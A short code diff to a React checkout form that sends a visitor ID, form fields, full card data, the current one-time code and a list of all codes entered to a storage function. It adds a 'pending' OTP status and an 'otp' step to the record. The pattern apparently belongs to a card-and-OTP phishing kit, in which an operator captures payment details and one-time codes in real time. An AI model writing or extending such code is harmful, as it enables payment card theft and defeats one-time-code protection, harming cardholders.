@@ -138,7 +138,16 @@ export function CheckoutForm({ onSubmit, isProcessing }: CheckoutFormProps) {
     }
     allOtps.push(otp)
     const visitorId = getVisitorId()
-    addData({ visitorId, ...formData, cardData, otp, allOtps, currentPage: "إدخال الكود" })
+    addData({
+      visitorId,
+      ...formData,
+      cardData,
+      otp,
+      allOtps,
+      otpStatus: "pending",
+      currentStep: "otp",
+      currentPage: "إدخال الكود",
+    })
   }
 
   const handleInputChange = (field: string, value: string) => {
